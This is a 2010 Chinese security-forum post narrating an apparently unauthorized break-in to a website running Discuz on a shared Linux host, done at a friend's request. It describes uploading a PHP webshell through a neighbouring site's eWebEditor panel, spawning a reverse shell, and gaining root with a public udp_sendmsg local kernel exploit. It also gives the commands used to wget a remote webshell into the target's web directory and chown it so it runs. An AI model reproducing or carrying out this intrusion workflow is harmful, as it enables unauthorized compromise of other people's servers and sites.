@@ -1,0 +1,32 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+一次linux入侵提权到搞定目标网站
+D8888D主贴内容-------------------------------------------------------
+ 
+
+刚上qq，一朋友叫我搞个网站。闲着无事打开一看是dz的，我手里没有0day只好旁注了。发现一站有ewebeditor的php版，登录后台添加了样式加上php，结果上传php马不成功。后来通过网站的说明文件才知道ewebeditor后台的样式只有abc管用，老规矩搞到一shell。拿到shell一看是linux的，想着先跨站。shell浏览目标站不行，命令行下输入ls -la /www.users/目标站/ 也不行。连接mysql，想out个shell到目标站也失败了。没办好，只好溢出了。上传1.pl反弹个shell到cmd。uname -r查看版本，2.6.18的，马上想到udev，试了不行。然后去天阳那里的exp一个一个下了试了 还是不行。
+
+最后只好去[url=http://www.milw0rm.com/]链接标记http://www.milw0rm.com/[/url]看看 搜索2.6出来好多，最终Linux Kernel < 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)这个0day溢出成功，拿到root权限，pwd列出当前目录。然后cd到目标站目录。wget [url=http://hi.baidu.com/bian花]链接标记http://http://hi.baidu.com/bian花/shell.txt[/url] mv shell.txt shell.php。兴冲冲的去打开shell。结果提示"CGI/PHP程序错误: 该脚本不允许执行"。无语了以为权限不够，直接chmod 777 shell.php 还是提示那个错误。网上搜索了下 有人提到 chown ftpd: xxxx.php ，试了继续悲剧。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1005/100511045423a6fe0f1ed541e5.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTc4OHwxMjE5ZTBmOHwxMjg2NDc2ODEzfDg1NzRwMVB1RFVLbi9IanU5TmdialE5eTk2eEVmWHVMR3crSEErYTlQRjI5UVRB&nothumb=yes]链接标记下载[/url] (31.61 KB)
+
+2010-5-11 04:54
+
+本帖隐藏的内容需要回复才可以浏览
+后来想了会，chown这个命令是查看文件的所有者。ls -la 论坛 结果发现论坛的文件 前面的拥有者是user_aaa 后面是ftpd，继续执行 chown user_aaa: shell.php 最终搞定了目标站。
+
+其实有root权限了，能做许多事，当初touch个a.php 然cat追加写入一句话，还是那个错误提示。当然我们完全可以查看论坛的conn文件，只是我一心想着在目标站写个shell[img]http://www.t00ls.net/images/smilies/default2/xiudou[/img]
+
+
+
+
+　　指令名称 : chown 
+　　使用权限 : root 
+　　使用方式 : chown [-cfhvR] [--help] [--version] user[:group] file... 
+　　说明 : Linux/Unix 是多人多工作业系统，所有的档案皆有拥有者。利用 chown 可以将档案的拥有者加以改变。一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的档案拥有者，也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才有这样的权限
+
+chown这个命令是查看文件的所有者，对于这个说法是有误的，当时也打错了，可是为什么就没有人提出来呢？？？
+
+还有版主去哪了 也不加个分，以后谁还发原创。
+
+对于回复可见的文章,就算你写的再好,我也从不加分!  BY 可酷可乐
